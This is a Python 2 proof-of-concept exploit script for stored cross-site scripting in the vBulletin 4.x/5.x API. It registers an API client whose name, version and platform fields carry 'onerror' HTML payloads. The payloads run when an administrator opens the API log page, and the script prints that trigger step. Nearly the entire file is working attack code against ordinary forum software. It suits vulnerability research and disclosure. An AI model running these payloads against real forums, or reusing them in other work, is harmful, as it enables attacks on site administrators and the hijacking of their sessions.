#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
@author: tintinweb 0x721427D8
'''
import urllib2, cookielib, urllib, json, hashlib

class Exploit(object):
    
    baseurl = None
    cookies = None
    
    def __init__(self,baseurl,params, debuglevel=1):
        self.cookies = cookielib.LWPCookieJar()
        handlers = [
                    urllib2.HTTPHandler(debuglevel=debuglevel),
                    urllib2.HTTPSHandler(debuglevel=debuglevel),
                    urllib2.HTTPCookieProcessor(self.cookies)
                    ]
        self.browser = urllib2.build_opener(*handlers)
        self.baseurl=baseurl
        self.params = params
    
    def call(self,path="",data={}):
        assert(isinstance(data,dict))
        data = urllib.urlencode(data)

        req = urllib2.Request("%s%s"%(self.baseurl,path),data)
        req.add_header("Content-Type", "application/x-www-form-urlencoded")

        return self.browser.open(req)
    
    def call_json(self,path=None,data={}):
        try:
            x=self.call(path,data).read()
            print "raw_response", x
            resp =  json.loads(x)
        except urllib2.HTTPError, he:
            resp = he.read()
        return resp


    def vb_init_api(self):
        params = {'api_m':'api_init'}
        params.update(self.params)
        data = self.call_json("?%s"%(urllib.urlencode(params)))  
        self.session = data
        return data
    
    def vb_call(self, params):
        api_sig = self._vb_build_api_sig(params)
        req_params = self._vb_build_regstring(api_sig)
        params.update(req_params)
        data = self.call_json("?%s"%(urllib.urlencode(params)),data=params)
        if not isinstance(data, dict):
            return data
        if 'errormessage' in data['response'].keys():
            raise Exception(data)
        return data

    def _ksort(self, d):
        ret = []
        for key, value in [(k,d[k]) for k in sorted(d.keys())]:
            ret.append( "%s=%s"%(key,value))
        return "&".join(ret)

    def _ksort_urlencode(self, d):
        ret = []
        for key, value in [(k,d[k]) for k in sorted(d.keys())]:
            ret.append( urllib.urlencode({key:value}))
        return "&".join(ret)

    def _vb_build_api_sig(self, params):
        apikey = self.params['apikey']
        login_string = self._ksort_urlencode(params)
        access_token = str(self.session['apiaccesstoken'])
        client_id = str(self.session['apiclientid'])
        secret = str(self.session['secret'])
        return hashlib.md5(login_string+access_token+client_id+secret+apikey).hexdigest()
    
    def _vb_build_regstring(self, api_sig):
        params = {
                  'api_c':self.session['apiclientid'],
                  'api_s':self.session['apiaccesstoken'],
                  'api_sig':api_sig,
                  'api_v':self.session['apiversion'],
                  }
        return params
    

if __name__=="__main__":
    TARGET = "http://localhost:8008/sectest/vbulletin_5/api.php"
    APIKEY = "G4YvWVhp"
    DEBUGLEVEL = 0          # 1 to enable request tracking

    print "vBulletin 5.x / 4.x - XSS in API"
    ### 1. XSS
    '''
    vbulletin: admincp => settings: options => vbulletin API and Mobile Application Options
                        * enable vbulletin API =       yes
                        * enable API log =             yes
    
    xss in:
        1)    http://xxxx/vb/admincp/apistats.php?do=client
        2)    click on hex<video><source/**/onerror='alert(1)'>hex
        2.1)  e.g.  http://xxxx/vb/admincp/apilog.php?do=viewclient&apiclientid=1
    
    '''
    params = {'clientname':"hex<video><source/**/onerror='alert(/clientname_1/)'>hex1",
             'clientversion':"hex<video><source/**/onerror='alert(2)'>hex2",
             'platformname':"hex<video><source/**/onerror='alert(3)'>hex3",
             'platformversion':"hex<video><source/**/onerror='alert(4)'>hex4",
             'uniqueid':"hex<video><source/**/onerror='alert(5)'>hex5",
             'apikey':APIKEY} 

    print "[  1 ] - xss - inject alert() to admincp"
    x = Exploit(baseurl=TARGET,params=params,debuglevel=DEBUGLEVEL)
    vars = x.vb_init_api()
    print vars
    
    """
$calls = array(
    'methods' => array(
        'login_login', 'api_init'
         ),
    'login_login' => array(
        'POST' => array(
            'vb_login_username' => 'admin',
            'vb_login_password' => 'password',
        ),
    ),
    'api_init' => array(
        'sessionhash' => '{session.dbsessionhash}'
    )
);
    
    """
    print "[*] GOT SESSIONHASH:",vars.get('sessionhash','<no-sessiohash>')
    
    '''
    calls = {'methods':['api_init'],
             'api_init':{
                         'sessionhash':vars['sessionhash']
                         }}
    '''
    # just a dummy call
    x.vb_call(params={'api_m':'api_forumlist',
                      'type':'t',
                      'x':"1"})
    print "[   *] SUCCESS! - now make an admin visit %s/admincp/apilog.php?do=viewclient&apiclientid=%s to trigger the XSS :)"%("/".join(TARGET.split("/")[:-1]),vars['apiclientid'])
    print "-- quit --"